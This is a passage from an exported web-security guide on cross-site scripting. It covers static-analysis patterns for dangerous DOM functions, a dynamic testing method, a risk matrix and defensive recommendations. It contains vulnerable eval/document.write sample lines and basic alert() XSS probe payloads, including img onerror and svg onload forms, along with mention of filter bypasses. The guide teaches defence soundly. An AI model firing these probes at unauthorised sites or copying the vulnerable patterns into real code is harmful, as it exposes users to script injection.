+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8054-9079-e885146a23df" class=""><strong>3. Dangerous DOM Functions:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8037-ab01-c02710922b71" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ VULNERABLE
+document.write(userInput);
+eval(userInput);
+
+// SAST Detection:
+# - Pattern: Dangerous function with user input
+# - Severity: High
+# - CWE: CWE-79
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-805c-a1ee-e00e70fd0501"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8037-9013-c9111b96aaf7" class=""><strong>DAST (Dynamic Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804e-9feb-e5b142bcfd1c" class=""><strong>Testing Methodology:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805e-9d1d-d0e5a1fe76f4" class=""><strong>1. Identify Input Points:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e6-9dad-dff1b284ce0c" class="bulleted-list"><li style="list-style-type:disc">Test all parameters, headers, cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8021-9c63-fac5d8b08c5b" class="bulleted-list"><li style="list-style-type:disc">Test file uploads, WebSocket messages</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8084-9e49-d2f4d7610bc7" class=""><strong>2. Submit Test Payloads:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80fe-aa76-e625102e4ba0" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+&lt;svg onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804b-b80a-f629f919fb57" class=""><strong>3. Analyze Response:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8055-a639-eaf1d695cd43" class="bulleted-list"><li style="list-style-type:disc">Check if payload is reflected</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e6-84e5-c2d9879497ad" class="bulleted-list"><li style="list-style-type:disc">Check if script executes</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8005-8cf4-f8434ff03b1b" class="bulleted-list"><li style="list-style-type:disc">Determine encoding/filtering</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c9-ab03-cefc82c2c500" class=""><strong>4. Test Bypasses:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f0-939a-ca895f6c4279" class="bulleted-list"><li style="list-style-type:disc">Encoding variations</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8032-88bc-fd8c812005fd" class="bulleted-list"><li style="list-style-type:disc">Filter bypasses</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801c-95ef-cad41caf5de3" class="bulleted-list"><li style="list-style-type:disc">Context-specific payloads</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-804b-b268-eaee5e3bfae9"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8090-a34d-d7c9a2c224af" class=""><strong>Risk Assessment</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-802a-83f6-f3e2477526cc" class=""><strong>Risk Matrix</strong></h3></div><div style="display:contents" dir="ltr"><table id="2d5562ad-76f0-8058-8261-fb5232ae4bb0" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8036-944b-fd491974a9bd"><th id="^R]F" class="simple-table-header-color simple-table-header">Vulnerability</th><th id="S}@P" class="simple-table-header-color simple-table-header">Likelihood</th><th id="&gt;tsz" class="simple-table-header-color simple-table-header">Impact</th><th id="cOq:" class="simple-table-header-color simple-table-header">Risk Level</th><th id="zgzp" class="simple-table-header-color simple-table-header">Business Impact</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8059-9078-e65673c7ba4c"><td id="^R]F" class=""><strong>Stored XSS</strong></td><td id="S}@P" class="">High</td><td id="&gt;tsz" class="">Critical</td><td id="cOq:" class=""><strong>Critical</strong></td><td id="zgzp" class="">Complete account compromise</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-808c-8c07-db34e956fa9d"><td id="^R]F" class=""><strong>Reflected XSS</strong></td><td id="S}@P" class="">High</td><td id="&gt;tsz" class="">High</td><td id="cOq:" class=""><strong>High</strong></td><td id="zgzp" class="">Session hijacking, phishing</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8022-a61b-d75fbab0b35e"><td id="^R]F" class=""><strong>DOM-Based XSS</strong></td><td id="S}@P" class="">Medium</td><td id="&gt;tsz" class="">High</td><td id="cOq:" class=""><strong>High</strong></td><td id="zgzp" class="">Client-side compromise</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80ce-b60e-ec011619a344"><td id="^R]F" class=""><strong>Missing CSP</strong></td><td id="S}@P" class="">High</td><td id="&gt;tsz" class="">Medium</td><td id="cOq:" class=""><strong>High</strong></td><td id="zgzp" class="">Increased XSS impact</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-808d-9dd2-d43e08fd063b"><td id="^R]F" class=""><strong>No Output Encoding</strong></td><td id="S}@P" class="">High</td><td id="&gt;tsz" class="">Critical</td><td id="cOq:" class=""><strong>Critical</strong></td><td id="zgzp" class="">Complete vulnerability</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8062-9131-e7326868b62f" class=""><strong>Risk Calculation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cc-a080-f2f051f4cbad" class=""><strong>Example: Stored XSS</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fb-bb43-f007ceeaf5c6" class=""><strong>Likelihood:</strong> High (0.8)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8097-85aa-f09c38c668ba" class="bulleted-list"><li style="list-style-type:disc">Common vulnerability</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8029-b188-e5686fa50c7b" class="bulleted-list"><li style="list-style-type:disc">Easy to exploit</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d4-a0e3-d20ba2ca6f59" class="bulleted-list"><li style="list-style-type:disc">Widespread impact</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d3-ba1c-c4a623cc4a12" class=""><strong>Impact:</strong> Critical (1.0)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8090-9cd0-f1236379b916" class="bulleted-list"><li style="list-style-type:disc">Session hijacking</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8096-89fe-df9dd3f0b4db" class="bulleted-list"><li style="list-style-type:disc">Account compromise</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8076-922a-f3bc6ea654dd" class="bulleted-list"><li style="list-style-type:disc">Data theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8050-967b-f6e1e3a9041b" class="bulleted-list"><li style="list-style-type:disc">Reputation damage</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b5-9326-e51f36b6c3b6" class=""><strong>Risk Score:</strong> 0.8 × 1.0 = <strong>0.8 (Critical Risk)</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804a-94fe-e9bf5534d386" class=""><strong>Business Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d7-a56e-fd317945f603" class="bulleted-list"><li style="list-style-type:disc"><strong>Financial</strong>: Account compromise, fraud</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8058-b543-d13eef1a1014" class="bulleted-list"><li style="list-style-type:disc"><strong>Reputation</strong>: Loss of customer trust</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80be-84d3-d60f9621fe1b" class="bulleted-list"><li style="list-style-type:disc"><strong>Legal</strong>: Data breach notifications, liability</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808f-8b64-d1958663f9d8" class="bulleted-list"><li style="list-style-type:disc"><strong>Operational</strong>: Incident response, remediation</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80be-9d85-f7e3e3512b89"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-809c-8ded-eec3325b8931" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8059-8636-e63fa2933f14" class="">XSS is a critical web application vulnerability. Key points:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8083-b61c-f36d1a585423" class="numbered-list" start="1"><li><strong>Always encode output</strong> based on context (HTML, JavaScript, URL, CSS)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-801d-859c-e6357cd35e84" class="numbered-list" start="2"><li><strong>Use CSP</strong> to reduce XSS impact</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8030-853b-fe993778acfa" class="numbered-list" start="3"><li><strong>Set HttpOnly cookies</strong> to prevent cookie theft</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80ed-a0f7-f7cc0e62a903" class="numbered-list" start="4"><li><strong>Validate input</strong> but don&#x27;t rely on it alone</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-805f-9234-db4a9aa8944d" class="numbered-list" start="5"><li><strong>Use safe DOM APIs</strong> (textContent, not innerHTML)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8072-9eb3-c96cd9b80f10" class="numbered-list" start="6"><li><strong>Test thoroughly</strong> - code reviews, penetration testing</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8003-ac25-ea609a4d7806" class="numbered-list" start="7"><li><strong>Follow security standards</strong> - OWASP guidelines</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802a-a04a-c93dd3245a74" class="">Remember: <strong>XSS is prevented by output encoding based on context, not by input validation or CSP alone!</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
